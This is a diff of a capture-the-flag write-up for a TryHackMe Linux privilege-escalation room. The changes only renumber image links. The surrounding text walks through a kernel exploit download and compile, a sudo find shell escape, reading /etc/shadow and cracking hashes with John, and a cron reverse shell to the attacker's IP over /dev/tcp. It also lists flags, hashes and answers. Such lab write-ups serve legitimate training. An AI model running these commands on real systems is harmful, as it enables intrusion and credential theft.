@@ -40,15 +40,15 @@ This task has us find a vulnerability (found from task 3) to exploit the machine
 
 `THM-28392872729920` - After downloading the .c file exploit from Task 3, we can get it onto our victim machine in whatever we can. A common way is via a Python Webserver.
 
-![](<../../../.gitbook/assets/image (173).png>)
+![](<../../../.gitbook/assets/image (188).png>)
 
 Now we can `wget` the file to the `/tmp/` directory on the victim
 
-![](<../../../.gitbook/assets/image (52).png>)
+![](<../../../.gitbook/assets/image (234).png>)
 
 Now we need to compile the code. `gcc pwn.c -o pwned` and execute the new file `./pwned`
 
-![](<../../../.gitbook/assets/image (42).png>)
+![](<../../../.gitbook/assets/image (248).png>)
 
 We verify we have escalated our privilege and are the root user with `whoami`. We should see root.
 
@@ -56,7 +56,7 @@ To find the flag I ran `find / -name flag*.txt`.
 
 We can now `cat` the file to receive our flag.
 
-![](<../../../.gitbook/assets/image (122).png>)
+![](<../../../.gitbook/assets/image (164).png>)
 
 ## Task 6
 
@@ -64,21 +64,21 @@ We can now `cat` the file to receive our flag.
 
 `3` - we can run `sudo -l` to find this answer. She has access to `find`, `less`, and `nano`.
 
-![](<../../../.gitbook/assets/image (51).png>)
+![](<../../../.gitbook/assets/image (293).png>)
 
 ### Question 2: What is the content of the flag2.txt file?
 
 `THM-402028394` - We cna look on [GTFOBins](https://gtfobins.github.io/) and look for ways to use the commands Karen does have access to run with sudo rights. Looking up find we see:
 
-![](<../../../.gitbook/assets/image (144).png>)
+![](<../../../.gitbook/assets/image (146).png>)
 
 So let's run `sudo find . -exec /bin/sh ; -quit` and see if we get root.
 
-![](<../../../.gitbook/assets/image (100) (1).png>)
+![](<../../../.gitbook/assets/image (286).png>)
 
 We do! So now we can find our flag.
 
-![](<../../../.gitbook/assets/image (162).png>)
+![](<../../../.gitbook/assets/image (180).png>)
 
 ### Question 3: How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?
 
@@ -88,7 +88,7 @@ We do! So now we can find our flag.
 
 `$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1` - The `/etc/shadow` file contains information about a Linux system's users, their passwords, and more. So if we cat that file, we can get franks password hash
 
-![](<../../../.gitbook/assets/image (85).png>)
+![](<../../../.gitbook/assets/image (368).png>)
 
 ## Task 7
 
@@ -96,7 +96,7 @@ We do! So now we can find our flag.
 
 `gerryconway` - Like in Task 6, we can list users and password using /etc/shadow, except we don't have permission, there is another file we can view though. `/etc/passwd`.
 
-![](<../../../.gitbook/assets/image (86).png>)
+![](<../../../.gitbook/assets/image (357).png>)
 
 Be sure to copy the contents of the /etc/passwd file to a .txt file
 
@@ -104,7 +104,7 @@ Be sure to copy the contents of the /etc/passwd file to a .txt file
 
 `Password1` - The room lets us know we can run `find / -type f -perm -04000 -ls 2>/dev/null` to find  SUID permissions. After looking through this list and comparing it to [GTFOBins](https://gtfobins.github.io/#+suid), I find one that they have in common, base64.
 
-![](<../../../.gitbook/assets/image (47).png>)
+![](<../../../.gitbook/assets/image (361).png>)
 
 This basically says if we assign the variable of LFILE to to a file, then use base64 to encode, then decode that file, we can then read that file. Since we are after the password for the user, we want to the see the `/etc/shadow` file.
 
@@ -112,21 +112,21 @@ This basically says if we assign the variable of LFILE to to a file, then use ba
 
 `base64 "$LFILE" | base64 --decode`
 
-![](<../../../.gitbook/assets/image (8) (1) (3).png>)
+![](<../../../.gitbook/assets/image (32).png>)
 
 Now we can use unshadow from the JohnTheRipper package to combine the files
 
-![](<../../../.gitbook/assets/image (128).png>)
+![](<../../../.gitbook/assets/image (150).png>)
 
-![](<../../../.gitbook/assets/image (109).png>)
+![](<../../../.gitbook/assets/image (46).png>)
 
 Time to crack the passwords!
 
 `john --wordlist=(WORDLIST.TXT) (FILE.TXT)`
 
-![](<../../../.gitbook/assets/image (107).png>)
+![](<../../../.gitbook/assets/image (158).png>)
 
-![](<../../../.gitbook/assets/image (32).png>)
+![](<../../../.gitbook/assets/image (379).png>)
 
 ### Question 3: What is the content of the flag3.txt file?
 
@@ -134,7 +134,7 @@ Time to crack the passwords!
 
 Running `find / -name flag3.txt` reveals it is under `/home/ubuntu/,` so cd to that directory.
 
-![](<../../../.gitbook/assets/image (50).png>)
+![](<../../../.gitbook/assets/image (288).png>)
 
 ## Task 8
 
@@ -144,7 +144,7 @@ This task focuses on Capabilities to gain root access. Root gives Karen access t
 
 `6` - Running `getcap -r / 2>/dev/null` will give us our answer. If we ran this without the `2>/dev/null` we would also see a lot of errors on screen.
 
-![](<../../../.gitbook/assets/image (113).png>)
+![](<../../../.gitbook/assets/image (194).png>)
 
 ### Question 2: What other binary can be used through its capabilities?
 
@@ -156,7 +156,7 @@ This task focuses on Capabilities to gain root access. Root gives Karen access t
 
 `THM-9349843` - After obtaining root, we can find the file location, cat it, obtaining our answer.
 
-![](<../../../.gitbook/assets/image (23).png>)
+![](<../../../.gitbook/assets/image (359).png>)
 
 ## Task 9
 
@@ -166,7 +166,7 @@ In this task we figure out how leverage Cron Jobs, schedule tasks, to become roo
 
 `4` - We can look at /`etc/crontab` to find this answer. This is available for nay user to look at.
 
-![](<../../../.gitbook/assets/image (121).png>)
+![](<../../../.gitbook/assets/image (155).png>)
 
 ### Question 2: What is the content of the flag5.txt file?
 
@@ -174,23 +174,23 @@ In this task we figure out how leverage Cron Jobs, schedule tasks, to become roo
 
 `bash -i >& /dev/tcp/<OUR_MACHINE_IP>/<PORT> 0>&1`
 
-![](<../../../.gitbook/assets/image (45).png>)
+![](<../../../.gitbook/assets/image (35).png>)
 
 In another terminal we can start our netcat listener
 
-![](<../../../.gitbook/assets/image (67).png>)
+![](<../../../.gitbook/assets/image (283).png>)
 
 Now we wait for the crontab to run. After a minute or two, we should receive our root shell.
 
-![](<../../../.gitbook/assets/image (387).png>)
+![](<../../../.gitbook/assets/image (253).png>)
 
-![](<../../../.gitbook/assets/image (371).png>)
+![](<../../../.gitbook/assets/image (1).png>)
 
 ### Question 3: What is Matt's password?
 
 `123456` - Running `cat /etc/shadow | grep matt` will give us his hash. Copy that to a .txt file and crack it.
 
-![](<../../../.gitbook/assets/image (148).png>)
+![](<../../../.gitbook/assets/image (162).png>)
 
 ## Task 10
 
@@ -204,11 +204,11 @@ Now we wait for the crontab to run. After a minute or two, we should receive our
 
 First we need to locate the file.
 
-![](<../../../.gitbook/assets/image (149).png>)
+![](<../../../.gitbook/assets/image (30).png>)
 
 Now we `echo $PATH`
 
-![](<../../../.gitbook/assets/image (77).png>)
+![](<../../../.gitbook/assets/image (362).png>)
 
 Now we add the folder we have write access to, to our path with `export PATH=/home/murdoch:$PATH`.
 
@@ -216,7 +216,7 @@ Now we create a file called `thm` with the contents of `cat /home/matt/flag6.txt
 
 From here we can run `./test` and obtain our flag.
 
-![](<../../../.gitbook/assets/image (152).png>)
+![](<../../../.gitbook/assets/image (199).png>)
 
 ## Task 11
 
@@ -224,19 +224,19 @@ From here we can run `./test` and obtain our flag.
 
 `3` - Running `showmount -e (IP`) will give us our answer
 
-![](<../../../.gitbook/assets/image (19).png>)
+![](<../../../.gitbook/assets/image (367).png>)
 
 ### Question 2: How many shares have the "no\_root\_squash" option enabled?
 
 `3` - Running cat `/etc/exports` will give us our answer. This checks the NFS configuration
 
-![](<../../../.gitbook/assets/image (20).png>)
+![](<../../../.gitbook/assets/image (227).png>)
 
 ### Question 3: What is the content of the flag7.txt file?
 
 `THM-89384012` - We can now mount the NFS onto our machine `mount -o rw (IP):(FOLDER) (FOLDER_ON_OUR_MACHINE)`
 
-![](<../../../.gitbook/assets/image (43).png>)
+![](<../../../.gitbook/assets/image (364).png>)
 
 The room gives us an executable we can run on the machine. I made a file nfs.c with the contents
 
@@ -268,11 +268,11 @@ We can use tools such as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/
 
 Started this by looking at the SUID Permissions.
 
-![](<../../../.gitbook/assets/image (81).png>)
+![](<../../../.gitbook/assets/image (239).png>)
 
 We can see that base64 can be used. So as in Task 7, we can follow the same suit.
 
-![](<../../../.gitbook/assets/image (418).png>)
+![](<../../../.gitbook/assets/image (447).png>)
 
 So let's try to cat the /etc/shadow file.
 
@@ -280,7 +280,7 @@ So let's try to cat the /etc/shadow file.
 
 `base64 "$LFILE" | base64 --decode`
 
-![](<../../../.gitbook/assets/image (338).png>)
+![](<../../../.gitbook/assets/image (3).png>)
 
 We can get the hashes for root, and missy.
 
@@ -290,38 +290,38 @@ We can get the hashes for root, and missy.
 
 We can put these files in a .txt file and attempt to crack them.
 
-![](<../../../.gitbook/assets/image (163).png>)
+![](<../../../.gitbook/assets/image (161).png>)
 
 We got the password for Missy! So lets switch users to missy. `su missy`
 
-![](<../../../.gitbook/assets/image (14).png>)
+![](<../../../.gitbook/assets/image (231).png>)
 
 `sudo find / -name flag*.txt` We now have the location of our flags as well
 
-![](<../../../.gitbook/assets/image (116).png>)
+![](<../../../.gitbook/assets/image (190).png>)
 
 ### Question 2: What is the content of the flag2.txt file?
 
 `THM-168824782390238` -&#x20;
 
-![](<../../../.gitbook/assets/image (192).png>)
+![](<../../../.gitbook/assets/image (132).png>)
 
 Sadly we don't have permission to the 2nd flag but lets see what sudo permissions Missy has with `sudo -l`
 
-![](<../../../.gitbook/assets/image (156).png>)
+![](<../../../.gitbook/assets/image (45).png>)
 
 We see Missy can run `find`. Similar to task 6, we can use the GTFO bin we used for that.
 
-![](<../../../.gitbook/assets/image (134).png>)
+![](<../../../.gitbook/assets/image (167).png>)
 
 `sudo find . -exec /bin/sh ; -quit`
 
-![](<../../../.gitbook/assets/image (155).png>)
+![](<../../../.gitbook/assets/image (168).png>)
 
 We are now root, can cat our file for our final flag!
 
 `cat /home/rootflag/flag2.txt`
 
-![](<../../../.gitbook/assets/image (66).png>)
+![](<../../../.gitbook/assets/image (294).png>)
 
 ## Congratulations! You have completed the Linux PrivEsc room!
